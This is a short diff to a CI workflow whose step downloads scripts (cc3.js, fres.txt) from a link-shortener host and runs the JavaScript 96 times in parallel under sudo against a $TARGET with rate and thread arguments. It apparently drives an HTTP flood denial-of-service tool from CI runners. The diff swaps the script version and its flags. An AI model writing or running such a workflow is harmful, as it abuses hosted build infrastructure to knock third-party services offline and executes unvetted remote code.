@@ -26,7 +26,7 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/Q7UL7/cc2.js
+        wget https://curl.by/FW3xU/cc3.js
         wget https://curl.by/di8qo/fres.txt
         chmod +x cc2.js
         npm i hpack https commander colors 
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..96}; do
-          sudo timeout $TIME node cc2.js POST "$TARGET" 120 10 "$RATE" fres.txt --full  --query 3
+          sudo timeout $TIME node cc3.js "$TARGET" 120 10 "$RATE" fres.txt --full --winter --debug
           PIDS+=($!)
         done
         
